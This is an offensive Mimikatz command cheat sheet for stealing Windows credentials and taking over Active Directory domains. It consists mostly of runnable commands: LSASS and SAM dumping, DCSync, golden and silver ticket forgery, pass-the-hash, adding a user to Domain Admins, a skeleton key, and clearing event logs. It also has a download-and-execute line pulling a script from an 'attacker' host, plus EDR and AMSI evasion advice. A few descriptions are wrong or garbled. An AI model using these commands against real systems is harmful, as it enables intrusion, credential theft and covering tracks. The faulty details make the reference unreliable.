# <span style="color:rgb(255, 192, 0)">Mimikatz - Complete Command Reference</span>

Mimikatz by Benjamin Delpy (@gentilkiwi) is the de facto tool for Windows credential extraction.

**Load:** `mimikatz.exe` | **Debug:** `privilege::debug` | **Remote:** `Invoke-Mimikatz`

---

## <span style="color:rgb(255, 0, 0)">1. Privilege Module</span>

```mimikatz
privilege::debug
```
- Enables `SeDebugPrivilege` for current process
- **Must run first** - Returns `20` = OK, `0` or error = not admin

```mimikatz
token::elevate
```
- Elevate admin token to SYSTEM (impersonate)

```mimikatz
token::revert
```
- Revert back to original token

```mimikatz
!+
```
- Load driver (`mimidrv.sys`) for kernel-level access

```mimikatz
!-
```
- Unload driver

```mimikatz
!processprotect /process:lsass.exe /remove
```
- Remove PPL (Protected Process Light) from lsass.exe
- Requires `!+` (driver loaded first)

---

## <span style="color:rgb(0, 176, 240)">2. Sekurlsa Module (LSASS Memory)</span>

```mimikatz
sekurlsa::logonpasswords
```
- Dumps all logged-on session credentials from LSASS
- Extracts: NTLM, SHA1, plaintext (WDigest), Kerberos tickets, DPAPI keys
- **OPSEC**: Very noisy, EDR hooks on LSASS

```mimikatz
sekurlsa::msv
```
- Dumps only MSV1_0 package (NTLM hashes)

```mimikatz
sekurlsa::ekeys
```
- Dumps Kerberos encryption keys (AES128, AES256, RC4, DES)

```mimikatz
sekurlsa::tickets /export
```
- Exports all Kerberos tickets as `.kirbi` files

```mimikatz
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<NTLM> /run:cmd.exe
```
- Pass-the-Hash: creates process with impersonated user
- `/aes256:<KEY>` for AES key

```mimikatz
sekurlsa::minidump lsass.dmp
```
- Load offline LSASS dump then run `sekurlsa::logonpasswords`

```mimikatz
sekurlsa::dpapi
```
- Extract DPAPI credentials from LSASS

```mimikatz
sekurlsa::credman
```
- Dump Windows Credential Manager

```mimikatz
sekurlsa::wdigest
```
- Dump WDigest credentials (plaintext if WDigest enabled)

```mimikatz
sekurlsa::livessp
```
- Dump LiveSSP credentials

```mimikatz
sekurlsa::cloudap
```
- Dump CloudAP (Microsoft Account) credentials

```mimikatz
sekurlsa::process
```
- List processes being monitored by sekurlsa

```mimikatz
sekurlsa::bootkey
```
- Extract boot key

---

## <span style="color:rgb(146, 208, 80)">3. LSADump Module (LSA, SAM, DC)</span>

### SAM (Local Accounts)

```mimikatz
lsadump::sam
```
- Dumps SAM (local account hashes) - requires SYSTEM

```mimikatz
lsadump::sam /sam:SAM /system:SYSTEM
```
- Offline SAM parsing from registry hives

### LSA Secrets

```mimikatz
lsadump::secrets
```
- Dumps LSA secrets - requires SYSTEM

```mimikatz
lsadump::secrets /system:SYSTEM /security:SECURITY
```
- Offline LSA parsing from registry hives

### DCSync

```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator
```
- DCSync (DRSUAPI replication) - requires DA/Replication rights

```mimikatz
lsadump::dcsync /domain:contoso.local /user:krbtgt
```
- DCSync specific user (krbtgt hash for golden ticket)

```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator /csv
```
- DCSync with CSV output

```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator /guid:{GUID}
```
- DCSync with invocation ID

```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator /authz
```
- DCSync with authz info

```mimikatz
lsadump::dcsync /domain:contoso.local /dc:dc01.contoso.local
```
- DCSync via specific DC

### Cache Dump

```mimikatz
lsadump::cache
```
- Dump cached domain logon hashes (mscache v2)

### Trust

```mimikatz
lsadump::trust
```
- Dump domain trust keys (for inter-realm TGTs)

```mimikatz
lsadump::trust /patch
```
- Patch trust extraction via LSASS

### PostZero

```mimikatz
lsadump::postzerologon /target:dc01.contoso.local /account:DC01$
```
- Post-ZeroLogon: Reset DC machine account password

---

## <span style="color:rgb(255, 0, 0)">4. Kerberos Module</span>

### Golden Ticket

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:<NTLM> /ptt
```
- Create golden ticket with NTLM hash

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /aes256:<AES256> /ptt
```
- Golden ticket with AES256 key

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:<NTLM> /id:500 /groups:512,513,518,519,520 /ptt
```
- Golden ticket with custom group RIDs

```mimikatz
kerberos::golden /user:FakeUser /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:<NTLM> /sids:S-1-5-21-ENTERPRISE-519 /ptt
```
- Golden ticket with SID history (Enterprise Admin)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:<NTLM> /tkt:ticket.kirbi
```
- Export golden ticket to file (no /ptt)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /rc4:<NTLM> /ptt
```
- Golden ticket with RC4 (NTLM)

### Silver Ticket

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:cifs /rc4:<SERVICE_NTLM> /ptt
```
- Silver ticket for CIFS (file share access)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:HOST /rc4:<NTLM> /ptt
```
- Silver ticket for HOST (scheduled tasks)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:LDAP /rc4:<NTLM> /ptt
```
- Silver ticket for LDAP (DCSync from DC)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:HTTP /rc4:<NTLM> /ptt
```
- Silver ticket for HTTP (WinRM)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:time /rc4:<NTLM> /ptt
```
- Silver ticket for TIME (used by some services)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:cifs,HOST,http /rc4:<NTLM> /ptt
```
- Silver ticket with multiple services

### Ticket Management

```mimikatz
kerberos::ptt ticket.kirbi
```
- Pass-the-Ticket: inject .kirbi into current session

```mimikatz
kerberos::ptt /ticket:base64_ticket_string
```
- Pass base64-encoded ticket

```mimikatz
kerberos::list
```
- List all Kerberos tickets in current session

```mimikatz
kerberos::tgt
```
- List TGT information

```mimikatz
kerberos::clist
```
- List cached tickets (detailed)

```mimikatz
kerberos::purge
```
- Purge all Kerberos tickets

```mimikatz
kerberos::destroy
```
- Destroy all Kerberos tickets

```mimikatz
kerberos::ask /target:target.contoso.local /service:cifs /user:Administrator /domain:contoso.local
```
- Request TGS for specific service

```mimikatz
kerberos::hash
```
- Show Kerberos hashes from memory

### Ticket Export/Import

```mimikatz
kerberos::writeclist /users:Administrator /domain:contoso.local
```
- Write cached tickets to file

```mimikatz
kerberos::readclist
```
- Read cached tickets from file

```mimikatz
sekurlsa::tickets /export
```
- Export all tickets from LSASS to .kirbi files

---

## <span style="color:rgb(0, 176, 240)">5. Crypto Module</span>

```mimikatz
crypto::capi
```
- List CryptoAPI containers

```mimikatz
crypto::certificates /export
```
- Export certificates from CERT_SYSTEM_STORE

```mimikatz
crypto::certificates /systemstore:local_machine /store:MY /export
```
- Export machine certificates

```mimikatz
crypto::keys /export
```
- Export CryptoAPI keys

```mimikatz
crypto::scagent
```
- List smartcard agents

---

## <span style="color:rgb(146, 208, 80)">6. DPAPI Module</span>

```mimikatz
dpapi::cache
```
- List cached DPAPI master keys

```mimikatz
dpapi::masterkey /in:C:\path\to\masterkey
```
- Decrypt a DPAPI master key

```mimikatz
dpapi::masterkey /in:C:\path\to\masterkey /rpc
```
- Decrypt master key via RPC (domain backup key)

```mimikatz
dpapi::blob /in:C:\path\to\blob /masterkey:key
```
- Decrypt a DPAPI blob

```mimikatz
dpapi::protect /data:base64_protected_data /masterkey:key
```
- Unprotect DPAPI-protected data

```mimikatz
dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Cookies"
```
- Decrypt Chrome data

```mimikatz
dpapi::vault /cred:C:\path\to\cred
```
- Decrypt Windows Vault credentials

```mimikatz
dpapi::wwa
```
- Dump Windows Web Account credentials

```mimikatz
dpapi::psk
```
- Dump Preshared Key credentials

---

## <span style="color:rgb(255, 0, 0)">7. Vault Module (Windows Vault/Credential Manager)</span>

```mimikatz
vault::list
```
- List credential vaults

```mimikatz
vault::cred /patch
```
- Extract vault credentials (requires patch)

```mimikatz
vault::cred
```
- List vault credentials

```mimikatz
vault::wwa
```
- Extract Windows Web Account credentials

---

## <span style="color:rgb(0, 176, 240)">8. RPC / Remote Module</span>

```mimikatz
lsadump::dcsync /dc:dc01.contoso.local /domain:contoso.local /user:krbtgt
```
- Remote DCSync

```mimikatz
lsadump::sam /server:target.contoso.local
```
- Remote SAM dump

```mimikatz
lsadump::secrets /server:target.contoso.local
```
- Remote LSA secrets dump

```mimikatz
lsadump::trust /server:target.contoso.local
```
- Remote trust dump

```mimikatz
lsadump::cache /server:target.contoso.local
```
- Remote cache dump

---

## <span style="color:rgb(146, 208, 80)">9. Misc Modules</span>

### Service Module

```mimikatz
service::+
```
- Start a service

```mimikatz
service::-
```
- Stop a service

```mimikatz
service::remove
```
- Remove a service

```mimikatz
service::list
```
- List services

### TS (Terminal Services)

```mimikatz
ts::sessions
```
- List active Terminal Services sessions

```mimikatz
ts::multirdp
```
- Enable multiple RDP sessions (patch)

```mimikatz
ts::rdp
```
- Patch RDP (enable NLA bypass)

### Net Module

```mimikatz
net::group /group:"Domain Admins" /user:attacker
```
- Add user to group (requires admin)

```mimikatz
net::group /delete /group:"Domain Admins" /user:attacker
```
- Remove user from group

```mimikatz
net::user /user:Administrator /password:NewPass
```
- Set user password

### Event Module

```mimikatz
event::drop 4888 4662 4624
```
- Drop specific event IDs (purge)

```mimikatz
event::clear
```
- Clear security log

```mimikatz
event::query /id=4624
```
- Query event log

### Process Module

```mimikatz
process::run /process:cmd.exe /args:"/c whoami" /runas:Administrator
```
- Run process as other user

```mimikatz
process::list
```
- List processes

```mimikatz
process::stop pid
```
- Kill process

### Token Module

```mimikatz
token::whoami
```
- Show current token info

```mimikatz
token::list
```
- List available tokens

```mimikatz
token::run /user:Administrator /process:cmd.exe
```
- Run process with specific token

### Misc

```mimikatz
misc::cmd
```
- Open admin cmd.exe from current context

```mimikatz
misc::regedit
```
- Open regedit as SYSTEM

```mimikatz
misc::skeleton
```
- Apply skeleton key (patch DC so any password works)
- **OPSEC**: Extremely dangerous, reboots required

```mimikatz
misc::memssp
```
- Install a SSP that logs plaintext passwords

```mimikatz
misc::lock
```
- Lock workstation (triggers login -> logonpasswords)

```mimikatz
misc::wifi
```
- Recover WiFi passwords

```mimikatz
misc::detours
```
- Detours hooking (logging)

```mimikatz
misc::sccm
```
- SCCM related operations

### Events / Log Management

```mimikatz
event::clear
```
- Clear security event log

```mimikatz
event::drop 4688 4624 4672
```
- Drop specific events

---

## <span style="color:rgb(255, 0, 0)">10. Invoke-Mimikatz (PowerShell)</span>

```powershell
# Load from URL
iex (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')

# Basic dump
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# DCSync
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:contoso.local /user:Administrator"'

# Dump credentials in separate process
Invoke-Mimikatz -DumpCreds

# Dump all
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::ekeys" "lsadump::sam" "lsadump::secrets"'

# Export tickets
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'

# Command with single quotes
Invoke-Mimikatz -Command "'privilege::debug' 'sekurlsa::logonpasswords'"
```

---

## <span style="color:rgb(0, 176, 240)">11. One-Liners</span>

```bash
# Command line (direct from binary)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:contoso.local /user:krbtgt" exit

# Base64 encoded command
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit | Out-File -Encoding ASCII out.txt

# Remote (crackmapexec/minikatz integration)
nxc smb target -u user -p pass -M mimikatz

# Remote (via wmiexec)
wmiexec.py domain/user:pass@target "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"

# Over RDP
mimikatz.exe exit
mstsc /v:target

# Procdump LSASS + offline
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Direct output redirection
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" exit
```

---

## <span style="color:rgb(146, 208, 80)">12. OPSEC & Bypass Considerations</span>

```yaml
AV/EDR Detection:
  - Mimikatz binary: Signature detection (killed immediately)
  - Invoke-Mimikatz: AMSI detection (reflection signatures)
  - LSASS access: Minifilter drivers, callback hooks
  - Event 4688: mimikatz.exe creation
  - Event 4663: LSASS handle request (sensitive)
  - Event 4662: LSASS process access

Bypass Techniques:
  - Use procmon to dump LSASS, analyze offline
  - Use .NET loading (execute-assembly in C2)
  - Use obfuscated PowerShell (AMSITrigger)
  - Use custom compiled version (modify signatures)
  
  # Obfuscated PowerShell load
  $m = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64));
  $m.EntryPoint.Invoke($null, (, [string[]] ('privilege::debug', 'sekurlsa::logonpasswords', 'exit')))

LSASS Protections:
  - Windows 10+ 1607: PPL (Protected Process Light)
  - Bypass: !+ (load driver) + !processprotect /process:lsass.exe /remove
  - Windows Defender Credential Guard: Virtualization-based
  - Bypass: Direct memory read via kernel driver
  - Attack: Downgrade attack (remove Credential Guard via GPO)
```

---

## <span style="color:rgb(255, 0, 0)">13. Common Attack Workflows</span>

### Full Credential Extraction

```mimikatz
privilege::debug
token::elevate
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::secrets
lsadump::cache
exit
```

### DCSync + Golden Ticket

```mimikatz
# Extract krbtgt
lsadump::dcsync /domain:contoso.local /user:krbtgt

# Create golden ticket
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /rc4:<KRBTGT_NTLM> /ptt

# Verify
kerberos::list
misc::cmd
```

### Pass-the-Hash + Lateral

```mimikatz
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<NTLM> /run:cmd.exe
```

### Silver Ticket for Persistence

```mimikatz
# Get service hash
lsadump::dcsync /domain:contoso.local /user:TARGET$

# Create silver ticket
kerberos::golden /user:FakeUser /domain:contoso.local /sid:S-1-5-21-XXXX /target:target.contoso.local /service:cifs /rc4:<NTLM> /ptt

# Access
dir \\target.contoso.local\c$
```
